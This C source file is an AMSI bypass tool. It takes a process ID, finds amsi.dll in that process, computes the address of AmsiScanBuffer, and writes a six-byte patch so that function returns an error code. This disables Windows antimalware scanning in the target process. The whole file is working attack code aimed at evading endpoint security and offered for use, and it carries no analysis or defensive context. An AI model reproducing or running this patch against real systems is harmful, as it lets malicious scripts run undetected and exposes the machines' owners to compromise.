#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>

uintptr_t get_remote_module_address(DWORD pid, const char* dll_name) {
    HANDLE handle_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (!handle_snapshot) return 0;

    MODULEENTRY32 me32;
    me32.dwSize = sizeof(MODULEENTRY32);

    uintptr_t base_address = 0;
    if (Module32First(handle_snapshot, &me32)) {
        do {
            if (_stricmp(me32.szModule, dll_name) == 0) {
                base_address = (uintptr_t)me32.modBaseAddr;
                break;
            }
        } while (Module32Next(handle_snapshot, &me32));
    }
    CloseHandle(handle_snapshot);
    return base_address;
}

uintptr_t get_api_offset(const char* dll_name, const char* api_name) {
    HMODULE handle_dll = LoadLibraryA(dll_name);
    if (!handle_dll) return 0;

    void* ptr_api = GetProcAddress(handle_dll, api_name);
    uintptr_t offset = (uintptr_t)ptr_api - (uintptr_t)handle_dll;
    FreeLibrary(handle_dll);
    return offset;
}

int main() {
    DWORD pid;
    printf("Target PID: ");
    scanf("%lu", &pid);

    uintptr_t amsi_address = get_remote_module_address(pid, "amsi.dll");
    uintptr_t offset = get_api_offset("amsi.dll", "AmsiScanBuffer");

    if (amsi_address == 0 || offset == 0) {
        printf("[-] Failed to find addresses.\n");
        return 1;
    }

    uintptr_t target_address = amsi_address + offset;
    printf("[+] Patch target address: 0x%p\n", (void*)target_address);

    // mov eax,0x80070057
    // ret
    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    // mov eax, 0x00000000
    // ret
    // unsigned char patch[] = {0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3};

    HANDLE handle_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (handle_process) {
        SIZE_T written;
        if (WriteProcessMemory(handle_process, (LPVOID)target_address, patch, sizeof(patch), &written)) {
            printf("[!] AmsiScanBuffer patched successfully.\n");
        } else {
            printf("[-] WriteProcessMemory failed. Error: %lu\n", GetLastError());
        }
        CloseHandle(handle_process);
    } else {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
    }

    return 0;
}